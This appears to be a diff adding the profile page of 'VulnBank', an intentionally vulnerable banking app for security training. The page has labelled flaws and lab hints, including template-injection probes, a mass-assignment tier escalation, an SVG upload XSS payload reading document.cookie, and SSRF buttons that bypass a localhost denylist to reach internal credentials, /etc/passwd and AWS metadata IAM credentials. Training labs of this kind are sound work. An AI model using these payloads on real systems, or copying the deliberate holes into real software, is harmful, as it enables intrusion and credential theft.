@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>VulnBank — Profile</title>
+  <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+<div class="vuln-warning">
+  ⚠️ INTENTIONALLY VULNERABLE — TRAINING ONLY
+</div>
+
+<nav class="navbar">
+  <a href="/dashboard.html" class="navbar-brand">Vuln<span class="gold">Bank</span></a>
+  <ul class="navbar-nav">
+    <li><a href="/dashboard.html">Dashboard</a></li>
+    <li><a href="/transfer.html">Transfer</a></li>
+    <li><a href="/profile.html" class="active">Profile</a></li>
+    <li><a href="#" onclick="logout()">Sign Out</a></li>
+    <li><span class="nav-user" id="nav-user"></span></li>
+  </ul>
+</nav>
+
+<div class="main-content">
+  <div class="page-header">
+    <h1>My Profile</h1>
+    <p>Manage your account details &nbsp;·&nbsp; Subscription: <span id="sub-badge"></span></p>
+  </div>
+
+  <div style="display:grid; grid-template-columns: 1fr 1fr; gap:20px;">
+
+    <!-- Profile Update Form -->
+    <div class="card">
+      <div class="card-header">
+        <h2>Account Information</h2>
+      </div>
+
+      <div id="alert-box" class="alert" style="display:none;"></div>
+
+      <!-- VULN: A02 — SSN displayed in plaintext -->
+      <div class="alert alert-warning" style="display:flex;margin-bottom:16px;">
+        <strong>VULN A02:</strong>&nbsp; SSN (plaintext): <strong id="ssn-display">Loading...</strong>
+      </div>
+
+      <form id="profile-form">
+        <div class="form-group">
+          <label for="full_name">Full Name</label>
+          <input type="text" id="full_name" class="form-control">
+          <div class="form-hint">
+            <strong>Lab SSTI-1:</strong> Set to <code>{{7*7}}</code> then download PDF statement.
+            Escalate: <code>{{FLAG}}</code> reveals the CTF flag.
+          </div>
+        </div>
+        <div class="form-group">
+          <label for="email">Email Address</label>
+          <input type="email" id="email" class="form-control">
+        </div>
+        <div class="form-group">
+          <label for="phone">Phone Number</label>
+          <input type="text" id="phone" class="form-control">
+        </div>
+        <div class="form-group">
+          <label for="address">Address</label>
+          <input type="text" id="address" class="form-control">
+        </div>
+
+        <!-- VULN: MA-1 — subscription_type field directly in form -->
+        <div class="form-group">
+          <label for="subscription_type">Subscription Tier</label>
+          <select id="subscription_type" class="form-control">
+            <option value="bronze">Bronze — $1,000 limit</option>
+            <option value="silver">Silver — $5,000 limit</option>
+            <option value="gold">Gold — $50,000 limit</option>
+          </select>
+          <div class="form-hint" style="color:var(--danger);">
+            <strong>VULN MA-1:</strong> This field is accepted by the server without validation.
+            You can also POST <code>{"subscription_type":"gold"}</code> to <code>/api/profile/update</code>.
+            After saving, re-login to get a new JWT with the escalated tier.
+          </div>
+        </div>
+
+        <button type="submit" class="btn btn-primary btn-block" id="save-btn">
+          Save Changes
+        </button>
+      </form>
+    </div>
+
+    <!-- Avatar Upload -->
+    <div>
+      <div class="card">
+        <div class="card-header">
+          <h2>Avatar Upload</h2>
+        </div>
+
+        <div id="avatar-alert" class="alert" style="display:none;"></div>
+
+        <!-- Avatar display — both methods -->
+        <div class="avatar-section">
+          <div class="avatar-preview">
+            <!-- Method 1: img tag — SVG scripts do NOT execute here -->
+            <img id="avatar-img" src="" alt="Avatar" style="width:100%;height:100%;object-fit:cover;" onerror="this.style.display='none'">
+          </div>
+          <div>
+            <p style="font-size:13px;margin-bottom:8px;"><strong>Current avatar:</strong></p>
+            <p style="font-size:12px;color:var(--text-light);">
+              URL: <a id="avatar-url-link" href="#" target="_blank" style="color:var(--navy);">No avatar</a>
+            </p>
+            <p style="font-size:11px;color:var(--danger-light);margin-top:4px;">
+              ↑ Open URL directly in new tab to execute embedded scripts
+            </p>
+          </div>
+        </div>
+
+        <!-- Method 2: object tag — SVG scripts WILL execute (VULN: VD-SVG) -->
+        <div style="margin-bottom:16px;">
+          <p style="font-size:12px;font-weight:600;color:var(--danger);margin-bottom:8px;">
+            VULN VD-SVG: &lt;object&gt; tag renders SVG with script execution:
+          </p>
+          <object id="avatar-object" data="" type="image/svg+xml"
+                  style="width:100px;height:100px;border-radius:8px;border:2px solid var(--gold);display:block;">
+          </object>
+        </div>
+
+        <form id="avatar-form" enctype="multipart/form-data">
+          <div class="form-group">
+            <label for="avatar-file">Upload File (any type accepted)</label>
+            <input type="file" id="avatar-file" class="form-control" accept="*/*">
+            <div class="form-hint">
+              <strong>VULN A08 / VD-SVG:</strong> No MIME check, no extension whitelist.
+              Upload an SVG with embedded <code>&lt;script&gt;</code> to execute JavaScript.
+            </div>
+          </div>
+          <button type="submit" class="btn btn-gold btn-block" id="upload-btn">
+            Upload Avatar
+          </button>
+        </form>
+
+        <div class="lab-info" style="margin-top:12px;">
+          <strong>XSS SVG Payload:</strong><br>
+          <code style="font-size:11px;">
+            &lt;svg xmlns="http://www.w3.org/2000/svg"&gt;<br>
+            &nbsp;&lt;script&gt;alert(document.cookie);&lt;/script&gt;<br>
+            &lt;/svg&gt;
+          </code>
+        </div>
+      </div>
+
+      <div class="card" style="border-left:4px solid var(--gold);">
+        <div class="card-header"><h2>SSRF Lab (A10)</h2></div>
+        <div class="form-hint" style="margin-bottom:12px;">
+          VULN A10 — The server fetches any URL you supply. Use it to reach services your browser cannot.
+        </div>
+
+        <p style="font-size:12px;font-weight:700;color:var(--navy);margin-bottom:6px;">Scenario 1 — Internal Service Discovery</p>
+        <div style="background:#fff5f5;border:1px solid #e74c3c;border-radius:6px;padding:8px 10px;font-size:11px;margin-bottom:8px;">
+          <strong>Denylist:</strong> <code>localhost</code> and <code>127.0.0.1</code> are blocked.<br>
+          <strong>Bypass:</strong> <code>http://2130706433:9000/</code> — decimal IP for 127.0.0.1
+          &nbsp;|&nbsp; <code>http://0x7f000001:9000/</code> — hex
+          &nbsp;|&nbsp; <code>http://0177.0.0.1:9000/</code> — octal
+        </div>
+        <div style="display:flex;flex-wrap:wrap;gap:6px;font-size:11px;margin-bottom:6px;">
+          <button class="btn btn-outline btn-sm" onclick="setSSRF('http://localhost:9000/docs')" style="border-color:#e74c3c;color:#c0392b;">localhost (blocked)</button>
+          <button class="btn btn-outline btn-sm" onclick="setSSRF('http://127.0.0.1:9000/docs')" style="border-color:#e74c3c;color:#c0392b;">127.0.0.1 (blocked)</button>
+          <button class="btn btn-outline btn-sm" onclick="setSSRF('http://2130706433:9000/docs')" style="border-color:#27ae60;color:#1e8449;font-weight:700;">2130706433 (bypass!)</button>
+          <button class="btn btn-outline btn-sm" onclick="setSSRF('http://0x7f000001:9000/docs')">0x7f000001</button>
+        </div>
+        <div style="display:flex;flex-wrap:wrap;gap:6px;font-size:11px;margin-bottom:14px;">
+          <button class="btn btn-outline btn-sm" onclick="setSSRF('http://internal-admin:9000/')">Admin /</button>
+          <button class="btn btn-outline btn-sm" onclick="setSSRF('http://internal-admin:9000/config')">/config (creds)</button>
+          <button class="btn btn-outline btn-sm" onclick="setSSRF('http://internal-admin:9000/users')">/users (hashes)</button>
+          <button class="btn btn-outline btn-sm" onclick="setSSRF('http://internal-admin:9000/logs')">/logs</button>
+          <button class="btn btn-outline btn-sm" onclick="setSSRF('http://internal-admin:9000/env')">/env</button>
+          <button class="btn btn-outline btn-sm" onclick="setSSRF('file:///etc/passwd')">file:///etc/passwd</button>
+        </div>
+
+        <p style="font-size:12px;font-weight:700;color:var(--navy);margin-bottom:6px;">Scenario 2 — Cloud Metadata (AWS IMDS)</p>
+        <div style="display:flex;flex-wrap:wrap;gap:6px;font-size:11px;margin-bottom:14px;">
+          <button class="btn btn-outline btn-sm" onclick="setSSRF('http://169.254.169.254/latest/meta-data/')">meta-data/</button>
+          <button class="btn btn-outline btn-sm" onclick="setSSRF('http://169.254.169.254/latest/meta-data/iam/security-credentials/')">IAM role name</button>
+          <button class="btn btn-outline btn-sm" onclick="setSSRF('http://169.254.169.254/latest/meta-data/iam/security-credentials/vulnbank-prod-role')">IAM credentials</button>
+          <button class="btn btn-outline btn-sm" onclick="setSSRF('http://169.254.169.254/latest/user-data')">user-data</button>
+          <button class="btn btn-outline btn-sm" onclick="setSSRF('http://169.254.169.254/latest/dynamic/instance-identity/document')">identity doc</button>
+        </div>
+
+        <div class="form-group">
+          <div style="display:flex;gap:8px;">
+            <input type="text" id="ssrf-url" class="form-control"
+              placeholder="http://internal-admin:9000/"
+              value="http://internal-admin:9000/">
+            <button class="btn btn-primary btn-sm" onclick="doSSRF()">Fetch</button>
+          </div>
+        </div>
+        <pre id="ssrf-result" style="display:none;background:#1e1e1e;color:#d4d4d4;padding:12px;border-radius:6px;font-size:11px;overflow:auto;max-height:280px;"></pre>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="/static/js/app.js"></script>
+<script src="/static/js/profile.js"></script>
+<script>
+function setSSRF(url) {
+    document.getElementById('ssrf-url').value = url;
+    doSSRF();
+}
+
+async function doSSRF() {
+    const url = document.getElementById('ssrf-url').value.trim();
+    const result = document.getElementById('ssrf-result');
+    result.style.display = 'block';
+    result.textContent = 'Fetching...';
+    try {
+        const resp = await fetch('/api/fetch-statement?url=' + encodeURIComponent(url), {
+            headers: authHeaders()
+        });
+        const data = await resp.json();
+        result.textContent = JSON.stringify(data, null, 2);
+    } catch (e) {
+        result.textContent = 'Error: ' + e.message;
+    }
+}
+</script>
+</body>
+</html>
